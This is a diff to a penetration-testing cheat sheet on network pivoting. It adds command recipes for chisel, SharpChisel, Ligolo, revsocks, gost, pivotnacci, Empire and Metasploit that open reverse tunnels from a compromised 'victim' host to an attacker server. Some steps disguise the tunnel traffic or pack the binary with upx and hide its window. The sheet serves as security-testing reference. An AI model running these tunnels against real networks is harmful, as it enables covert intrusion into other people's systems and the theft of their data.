@@ -8,11 +8,16 @@
   * [Local Port Forwarding](#local-port-forwarding)
   * [Remote Port Forwarding](#remote-port-forwarding)
 * [Proxychains](#proxychains)
+* [Graphtcp](#graphtcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
+* [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
 * [Metasploit](#metasploit)
 * [sshuttle](#sshuttle)
 * [chisel](#chisel)
+  * [SharpChisel](#sharpchisel)
+* [gost](#gost)
 * [Rpivot](#rpivot)
+* [RevSocks](#revsocks)
 * [plink](#plink)
 * [ngrok](#ngrok)
 * [Basic Pivoting Types](#basic-pivoting-types)
@@ -77,6 +82,17 @@ socks4 localhost 8080
 
 Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
+## Graphtcp
+
+Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+
+```powershell
+git clone https://github.com/hmgle/graftcp.git
+cd graftcp && make
+graftcp-local/graftcp-local
+./graftcp chromium-browser
+```
+
 ## Web SOCKS - reGeorg
 
 [reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
@@ -103,6 +119,17 @@ optional arguments:
   -v , --verbose       Verbose output[INFO|DEBUG]
 ```
 
+## Web SOCKS - pivotnacci
+
+[pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.
+
+```powershell
+pip3 install pivotnacci
+pivotnacci  https://domain.com/agent.php --password "s3cr3t"
+pivotnacci  https://domain.com/agent.php --polling-interval 2000
+```
+
+
 ## Metasploit
 
 ```powershell
@@ -123,7 +150,12 @@ or
 
 # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
 run autoroute -s 192.168.15.0/24 
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+set SRVPORT 9090
+set VERSION 4a
+# or
+use auxiliary/server/socks4a     # (deprecated)
+
 
 # Meterpreter list all active routes
 run autoroute -p 
@@ -135,6 +167,15 @@ route add 192.168.14.0 255.255.255.0 3
 route delete 192.168.14.0 255.255.255.0 3 
 # Meterpreter delete all routes
 route flush 
+```
+
+## Empire
+
+```powershell
+(Empire) > socksproxyserver
+(Empire) > use module management/invoke_socksproxy
+(Empire) > set remoteHost 10.10.10.10
+(Empire) > run
 ```
 
 ## sshuttle
@@ -150,6 +191,12 @@ pacman -Sy sshuttle
 apt-get install sshuttle
 sshuttle -vvr user@10.10.10.10 10.1.1.0/24
 sshuttle -vvr username@pivot_host 10.2.2.0/24 
+
+# using a private key
+$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
+
+# -x == exclude some network to not transmit over the tunnel
+# -x x.x.x.x.x/24
 ```
 
 ## chisel
@@ -161,6 +208,67 @@ go get -v github.com/jpillora/chisel
 # forward port 389 and 88 to hacker computer
 user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
+```
+
+### SharpChisel
+
+A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel
+
+```powershell
+user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
+================================================================
+server : run the Server Component of chisel 
+-p 8080 : run server on port 8080
+--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
+--auth "user:pass" : Creds required to connect to the server
+--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
+--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.
+
+user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
+```
+
+## Ligolo
+
+Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
+
+
+1. Build Ligolo
+  ```powershell
+  # Get Ligolo and dependencies
+  cd `go env GOPATH`/src
+  git clone https://github.com/sysdream/ligolo
+  cd ligolo
+  make dep
+
+  # Generate self-signed TLS certificates (will be placed in the certs folder)
+  make certs TLS_HOST=example.com
+
+  make build-all
+  ```
+2. Use Ligolo
+  ```powershell
+  # On your attack server.
+  ./bin/localrelay_linux_amd64
+
+  # On the compromise host.
+  ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
+  ```
+
+## Gost
+
+> Wiki English : https://docs.ginuerzh.xyz/gost/en/
+
+```powershell
+git clone https://github.com/ginuerzh/gost
+cd gost/cmd/gost
+go build
+
+# Socks5 Proxy
+Server side: gost -L=socks5://:1080
+Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true
+
+# Local Port Forward
+gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
 ```
 
 ## Rpivot
@@ -191,6 +299,38 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 --ntlm-proxy-port 8080 --domain CORP --username jdoe \
 --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
 ```
+
+## revsocks
+
+```powershell
+# Listen on the server and create a SOCKS 5 proxy on port 1080
+user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
+
+# Connect client to the server
+user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
+user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
+```
+
+
+```powershell
+# Build for Linux
+git clone https://github.com/kost/revsocks
+export GOPATH=~/go
+go get github.com/hashicorp/yamux
+go get github.com/armon/go-socks5
+go get github.com/kost/go-ntlmssp
+go build
+go build -ldflags="-s -w" && upx --brute revsocks
+
+# Build for Windows
+go get github.com/hashicorp/yamux
+go get github.com/armon/go-socks5
+go get github.com/kost/go-ntlmssp
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+go build -ldflags -H=windowsgui
+upx revsocks
+```
+
 
 ## plink
 
@@ -223,7 +363,17 @@ unzip ngrok-stable-linux-amd64.zip
 ./ngrok tcp 4433
 ```
 
+## cloudflared
 
+```bash
+# Get the binary
+wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
+tar xvzf cloudflared-stable-linux-amd64.tgz
+# Expose accessible internal service to the internet
+./cloudflared tunnel --url <protocol>://<host>:<port>
+```
+  
+  
 ## Basic Pivoting Types
 
 | Type              | Use Case                                    |
@@ -261,8 +411,9 @@ unzip ngrok-stable-linux-amd64.zip
 
 ## References
 
-* [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
 * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
 * [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
 * [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
+* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre Zanni](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
+* [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
